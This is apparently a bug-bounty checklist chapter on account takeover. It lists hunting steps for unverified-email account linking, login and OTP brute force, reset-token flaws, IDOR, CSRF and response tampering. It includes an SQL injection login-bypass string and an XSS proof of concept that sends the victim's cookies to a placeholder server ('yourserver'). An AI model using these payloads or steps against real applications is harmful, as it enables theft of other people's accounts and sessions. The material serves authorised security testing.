# 12. Account Takeover (ATO) Checklist

Many of the ideas in this section are inspired by [HubSpot Full Account Takeover](https://medium.com/bugbountywriteup/hubspot-full-account-takeover-in-bug-bounty-4e2047914ab5).

## OAuth → Account Takeover

```
https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover
```

## Pre-Account Takeover

A pre-account takeover happens when an attacker creates an account using one signup method and the victim later creates an account with the **same email** but a different signup method. Because the email matches, the application stitches both registrations into a single user. This bites whenever the application does not strictly verify the email.

### How to hunt

1. Try to register any email **without verifying it**.
2. Try registering a second account using the same email but a different method — for example "Sign in with Google".
3. Because both registrations share the same email, the application links them.
4. Try logging in with the username/password you set in step 1. If you can see the data created via the Google flow, you have a pre-ATO.

## Account takeover via improper rate limiting

### How to hunt

1. Capture the login request while submitting username + password.
2. Send it to Burp Intruder and brute force.
3. Analyse responses (status, length, headers) for the success oracle.

## Account takeover by abusing sensitive data exposure

Sensitive data exposure happens when a web application does not properly protect confidential information, leaking sensitive data or user details to third parties.

Sometimes the application returns useful junk such as valid OTPs, password hashes, or even passwords inside response bodies, headers, or hidden fields. Always inspect every response carefully.

### Login

- Check whether you can brute-force the password.
- Test for OAuth misconfigurations.
- Check whether you can brute-force the login OTP.
- Test for JWT misconfigurations.
- Try authentication-bypass SQLi (e.g. `';admin" or 1=1`).
- Check whether the application validates the OTP / token at all.

### Password reset

- Check whether you can brute-force the password-reset OTP.
- Check whether the reset token is predictable.
- Test for JWT misconfigurations.
- Check whether the password-reset endpoint is vulnerable to IDOR.
- Check whether the password-reset endpoint is vulnerable to Host Header Injection.
- Check whether the password-reset endpoint leaks the token / OTP in the HTTP response.
- Check whether the application validates the OTP / token.
- Try HTTP Parameter Pollution (HPP).

## XSS → Account Takeover

If the application does not use auth tokens, or if `HttpOnly` makes cookies unreachable, you can still steal the CSRF token and craft a request that changes the victim's email or password.

- Try to exfiltrate cookies.
- Try to exfiltrate the auth token.
- If the cookie's `Domain` attribute is set, look for XSS on subdomains and use it to steal cookies.

### Example PoC

This script creates a hidden `<img>` element. When the browser loads the image, the victim's cookies are sent to the attacker:

```html
<script>
   var new_img = document.createElement('img');
   new_img.src = "http://yourserver/" + document.cookie;
   new_img.style = 'display: none;';
   document.body.appendChild(new_img);
</script>
```

## CSRF → Account Takeover

- Check whether the email-update endpoint is vulnerable to CSRF.
- Check whether the password-change endpoint is vulnerable to CSRF.

## IDOR → Account Takeover

- Check whether the email-update endpoint is vulnerable to IDOR.
- Check whether the password-change endpoint is vulnerable to IDOR.
- Check whether the password-reset endpoint is vulnerable to IDOR.

## Account takeover by manipulating response status codes

Replace error responses (`4xx`, `false`, `failed`) with success responses (`200`, `true`, `success`) and see whether the client treats it as authenticated.

## Account takeover via weak cryptography

```
Reference reading:
https://infosecwriteups.com/weak-cryptography-in-password-reset-to-full-account-takeover-fc61c75b36b9
```
